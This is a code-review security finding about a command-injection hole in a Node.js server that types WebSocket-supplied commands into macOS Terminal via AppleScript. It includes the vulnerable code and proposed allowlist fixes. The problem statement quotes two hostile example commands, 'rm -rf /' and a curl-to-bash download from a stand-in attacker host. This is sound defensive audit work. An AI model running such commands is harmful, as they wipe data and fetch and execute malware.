---
status: complete
priority: p1
issue_id: "002"
tags: [code-review, security, command-injection]
dependencies: []
---

# Unrestricted Command Injection via AppleScript

## Problem Statement

Any authenticated user can execute arbitrary shell commands on the host machine through the `inject` action. The current escaping is focused on AppleScript string safety, not command injection prevention. Commands like `rm -rf /` or `curl evil.com/malware.sh | bash` work without restriction.

**Why it matters:** Token compromise equals full machine compromise. This is the most critical vulnerability in the codebase.

## Findings

**Location:** `/Users/austin/Git_Repos/claude_remote/server.js:435-465`

```javascript
function injectCommand(command) {
  const escapedCommand = command
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n');

  const appleScript = `
    tell application "Terminal"
      activate
      ...
      keystroke "${escapedCommand}"
      keystroke return
    end tell
  `;
```

**Evidence:**
- No command allowlist or blocklist
- No rate limiting on command injection
- Incomplete escaping (doesn't handle `$`, backticks, etc.)
- Commands are typed directly into Terminal via keystrokes

**Discovered by:** security-sentinel, architecture-strategist agents

## Proposed Solutions

### Option A: Implement Command Allowlist (Recommended)
**Pros:** Secure, limits attack surface
**Cons:** Reduces flexibility, needs maintenance
**Effort:** Medium
**Risk:** Low

```javascript
const ALLOWED_COMMANDS = [
  /^\/clear$/,
  /^\/compact$/,
  /^\/status$/,
  /^y$/,
  /^n$/,
  /^[a-zA-Z0-9\s\-_.\/]+$/  // Basic safe characters
];

function validateCommand(command) {
  return ALLOWED_COMMANDS.some(pattern => pattern.test(command));
}
```

### Option B: Add Dangerous Command Blocklist
**Pros:** Maintains flexibility
**Cons:** Blocklists are bypassable, false sense of security
**Effort:** Small
**Risk:** High (incomplete protection)

### Option C: Add Confirmation for Dangerous Commands
**Pros:** User remains in control
**Cons:** Still allows dangerous commands with extra click
**Effort:** Medium
**Risk:** Medium

## Recommended Action

_To be filled during triage_

## Technical Details

**Affected files:** `server.js`
**Components:** Command injection, WebSocket handler
**Database changes:** None

## Acceptance Criteria

- [ ] Dangerous shell metacharacters are blocked or escaped properly
- [ ] Rate limiting prevents rapid command injection
- [ ] Audit logging shows all injected commands
- [ ] Consider: allowlist for safe commands only

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2026-01-25 | Created finding | Fundamental architecture allows arbitrary command execution |

## Resources

- OWASP: A03 Injection
- CWE-78: OS Command Injection
